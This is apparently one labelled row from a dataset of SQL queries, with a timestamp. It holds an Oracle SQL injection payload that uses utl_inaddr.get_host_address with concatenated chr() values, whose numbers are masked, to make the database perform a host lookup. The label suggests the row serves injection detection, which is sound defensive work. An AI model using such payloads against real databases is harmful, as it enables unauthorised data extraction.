1,select top # * from galaxy and utl_inaddr.get_host_address((chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#)||chr(#))) and #=#
2019-12-20 08:53:00,1
